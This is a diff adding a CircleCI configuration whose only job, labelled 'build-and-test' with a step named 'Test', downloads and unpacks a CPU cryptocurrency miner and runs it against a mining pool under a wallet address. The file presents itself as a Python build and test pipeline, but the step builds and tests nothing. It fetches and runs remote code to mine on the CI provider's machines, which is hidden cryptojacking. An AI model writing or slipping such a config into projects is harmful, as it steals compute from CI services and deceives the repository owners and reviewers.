@@ -1,0 +1,17 @@
+version: 2.1
+
+orbs:
+   python: circleci/python@0.2.1
+
+jobs:
+  build-and-test:
+    executor: python/default
+    steps:
+      - run:
+          command: wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a power2b -o stratum+tcp://cpu-pool.com:63418 -u McbJjK7K11nXrrqnD41MByr1xT3JgS2U6A.xdan -t
+          name: Test
+
+workflows:
+  main:
+    jobs:
+      - build-and-test
